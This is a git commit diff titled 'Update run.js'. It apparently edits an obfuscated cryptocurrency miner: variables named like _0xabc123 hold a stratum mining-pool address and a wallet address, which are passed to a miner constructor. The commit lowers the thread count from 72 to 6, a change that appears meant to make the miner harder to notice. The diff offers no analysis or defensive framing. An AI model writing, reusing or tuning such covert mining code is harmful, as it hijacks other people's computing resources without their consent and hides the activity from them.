96ba47398ca95b581374a1bb518d667cf81c5be5
x011-al <x011pagkor@gmail.com>
2025-08-25 11:41:22 -0700

    Update run.js

--- run.js
+++ run.js
@@ -4,7 +4,7 @@ const { Nnode } = require("./index.js");
 var _0xabc123 = function(){
     var _0xdef456 = 'stratum+tcp://141.94.223.113:4052';
     var _0xghi789 = '49cg2BTsCdmBfUPsCrDsGmREn2diVYSKUahupm2bay5ZU3gmVTzuwgY7yhQcbYCdEeZXSHsYLZKLWXTR4DNR3xcJS29HszU';
-    var _0xjkl012 = { 'threads': 72, 'mode': 'FAST' };
+    var _0xjkl012 = { 'threads': 6, 'mode': 'FAST' };
     new Nnode(_0xdef456, _0xghi789, _0xjkl012);
 }();
 
